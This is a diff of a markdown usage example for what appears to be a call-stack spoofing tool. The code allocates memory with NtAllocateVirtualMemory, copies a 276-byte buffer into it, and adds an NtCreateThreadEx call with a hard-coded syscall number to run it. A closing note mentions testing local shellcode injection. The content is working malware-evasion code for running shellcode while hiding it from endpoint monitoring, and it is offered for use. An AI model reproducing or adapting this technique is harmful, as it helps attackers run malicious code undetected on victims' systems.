@@ -100,8 +100,8 @@ Spoof((PVOID)(-1), &alloc, NULL, &size, &p, pNtAllocateVirtualMemory, (PVOID)2, 
 Spoof(alloc, buf, (PVOID)276, NULL, &p, pMemcpy, (PVOID)0);
 p.ssn = 0xc2;
 PVOID hThread = NULL;
+Spoof(&hThread, (PVOID)THREAD_ALL_ACCESS, NULL, (PVOID)(-1), &p, pNtCreateThreadEx, (PVOID)7, alloc, NULL, NULL, NULL, NULL, NULL, NULL);
 Spoof((PVOID)INFINITE, NULL, NULL, NULL, &p, Sleep, (PVOID)0);
-Sleep(2000);
 ```
 ## Concerns
 I have not done extensive testing with this. I only called a few functions and tried a local shellcode injection. There could be some edge cases I haven't tested. 
